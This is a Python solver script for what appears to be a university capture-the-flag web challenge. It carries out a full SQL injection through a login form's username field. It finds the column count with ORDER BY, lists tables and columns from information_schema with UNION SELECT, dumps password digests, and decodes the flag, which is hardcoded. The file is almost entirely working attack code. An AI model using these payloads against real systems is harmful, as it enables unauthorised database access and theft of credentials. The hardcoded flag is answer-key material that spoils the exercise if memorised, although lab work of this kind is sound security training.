import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag
import base64

BASE_URL = "https://another-castle.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    # Number of columns: 1
    def get_num_columns(self):
        for i in range(1, 100):
            PAYLOAD = f"""' ORDER BY {i}; -- x"""
            response = self.session.post(f"{BASE_URL}/login", data={"username": PAYLOAD, "password": ""})
            if "Internal Server Error" in response.text:
                return i - 1

    def main(self):
        GET_TABLE_NAME_PAYLOAD = """' UNION SELECT table_name FROM information_schema.tables; -- x"""
        response = self.session.post(f"{BASE_URL}/login", data={"username": GET_TABLE_NAME_PAYLOAD, "password": ""}) # table_name = "users"

        GET_COLUMN_NAME_PAYLOAD = """' UNION SELECT column_name FROM information_schema.columns WHERE table_name = "users" LIMIT 1 OFFSET 2; -- x"""
        response = self.session.post(f"{BASE_URL}/login", data={"username": GET_COLUMN_NAME_PAYLOAD, "password": ""}) # column_names = ["id", "username", "password_digest"

        GET_DATA_PAYLOAD = """' UNION SELECT password_digest FROM users LIMIT 1 OFFSET 6; -- x"""
        response = self.session.post(f"{BASE_URL}/login", data={"username": GET_DATA_PAYLOAD, "password": ""}) # password_digest = "Q09NUDY0NDN7bWFja19pc190aGVfYWRtaW5fbm93fQ=="

        decoded_flag = base64.b64decode("Q09NUDY0NDN7bWFja19pc190aGVfYWRtaW5fbm93fQ==").decode()
        find_flag(decoded_flag)

if __name__ == "__main__":
    Solver().main()
